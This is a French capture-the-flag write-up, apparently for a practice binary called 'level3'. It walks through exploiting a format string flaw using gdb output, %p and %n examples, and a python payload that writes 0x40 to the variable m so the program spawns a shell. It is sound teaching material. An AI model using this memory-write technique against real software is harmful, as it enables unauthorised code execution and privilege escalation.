# Format String Exploitation

En décompilant l'exécutable, on remarque que le programme compare une variable statique `m` à la valeur `0x40`. Il contient également un printf qui ne prend qu'un argument. Nous allons exploiter la faille `format string`.

L'objectif est d'utiliser les modifiers de `printf` pour écrire à l'adresse de la variable `m`, la valeur `0x40` et ainsi valider la condition qui exécutera un shell.

Pour comprendre la faille, voici quelques exemples. Exécutons `gdb` pour avoir une idée du fonctionnement de la stack :
```
> gdb level3
[...]
> (gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	    push   %ebp
   0x080484a5 <+1>:	    mov    %esp,%ebp
   0x080484a7 <+3>:	    sub    $0x218,%esp
   0x080484ad <+9>:	    mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
```

On break juste après l'exécution du `printf` pour observer la stack, puis on lance le programme.
```
> (gdb) b *0x080484da
[...]
> (gdb) r
```

Voyons avec un exemple simple, donnons en argument la chaine de caractère `AAAA` :
```
AAAA

> (gdb) x/20wx $esp
0xbffff500:	0xbffff510	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff510:	0x41414141	0xb7e2000a	0x00000001	0xb7fef305
            ^
            AAAA
0xbffff520:	0xbffff578	0xb7fde2d4	0xb7fde334	0x00000007
0xbffff530:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff578
0xbffff540:	0x00000040	0x00000b80	0x00000000	0xb7fde714
```

On remarque que `printf` a écrit en mémoire notre chaine de caractère. Essayons maintenant d'utiliser le modifier `%p` qui sert à afficher l'adresse d'un pointer. Nous pouvons associer `%p` avec les modifiers `4$` qui sert à indiquer à `printf` qu'il faut utiliser le 4ème argument.
```
AAAA%$4p
AAAA0x41414141
> (gdb) x/20wx $esp
0xbffff500:	0xbffff510	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff510:	0x41414141	0xb7e2000a	0x00000001	0xb7fef305
            ^
            AAAA
0xbffff520:	0xbffff578	0xb7fde2d4	0xb7fde334	0x00000007
0xbffff530:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff578
0xbffff540:	0x00000040	0x00000b80	0x00000000	0xb7fde714
```

Si on raisonne de la manière dont `printf` s'exécute, il écrit d'abord `AAAA` en mémoire, puis affiche l'adresse du 4ème argument, qui est maintenant `0x41414141`.

Il est également possible d'écrire dans la mémoire grace au modifier `%n`. `%n` écrit simplemement le nombre de charactères qui ont été affichés par `printf`. En combinant `%n` avec les modifiers `4$`, on peut ainsi écrire une certaine valeur à une adresse donnée.
```
AAAA%4$n
AAAA
> (gdb) x/20wx $esp
0xbffff500:	0xbffff510	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff510:	0x41414141	0xb7e2000a	0x00000001	0xb7fef305
            ^
            AAAA
0xbffff520:	0xbffff578	0xb7fde2d4	0xb7fde334	0x00000007
0xbffff530:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff578
0xbffff540:	0x00000040	0x00000b80	0x00000000	0xb7fde714
```
Toujours dans la logique de `printf`, on imprime `AAAA`, puis, on écrit la valeur 0x04 (puisque 4 caractères ont été écrits), à l'adresse du 4ème argument, ici `0x41414141`. On a donc un `SEGFAULT` puisqu'il est impossible d'accéder à l'emplacement `0x41414141`.

Notre but est d'écrire `0x40` soit `64` en base 10, à l'emplacement mémoire de `m`. Pour connaitre son emplacement en mémoire, on éxecute :
```
> (gdb) Info variables
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw
0x080485fc  _IO_stdin_used
0x08048734  __FRAME_END__
0x08049738  __CTOR_LIST__
0x08049738  __init_array_end
0x08049738  __init_array_start
0x0804973c  __CTOR_END__
0x08049740  __DTOR_LIST__
0x08049744  __DTOR_END__
0x08049748  __JCR_END__
0x08049748  __JCR_LIST__
0x0804974c  _DYNAMIC
0x08049818  _GLOBAL_OFFSET_TABLE_
0x0804983c  __data_start
0x0804983c  data_start
0x08049840  __dso_handle
0x08049860  stdin@@GLIBC_2.0
0x08049880  stdout@@GLIBC_2.0
0x08049884  completed.6159
0x08049888  dtor_idx.6161
0x0804988c  m
```
L'adresse de `m` est donc `0x0804988c`

De manière abstraite, on peut représenter notre argument de l'entrée standard de cette manière :
```
adresse_m + 60_caractères + %4$n
^           ^               ^
4 octets  + 60 octets (=64) écrire la valeur 64 à
                            l'adresse du 4ème argument
                            (adresse de m)
```
Si on exécutait `gdb` avec une commande comme celle ci, on obtiendrais un résultat similaire à celui-ci :
```
> (gdb) x/20wx $esp
0xbffff500:	0xbffff510	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff510:	0x0804988c	0x41414141	0x41414141	0x41414141
            ^           ^
            adresse de  60 caractères A
            m
0xbffff520:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff530:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff540:	0x41414141	0x41414141	0x41414141	0x41414141
```
Nous utilisons `python` pour formatter notre input :
```
python -c 'print("\x8c\x98\x04\x08" + "A"*60 + "%4$n")' > /tmp/input
```
Puis nous injectons notre input dans `level3` :
```
cat /tmp/input - | ./level3
```
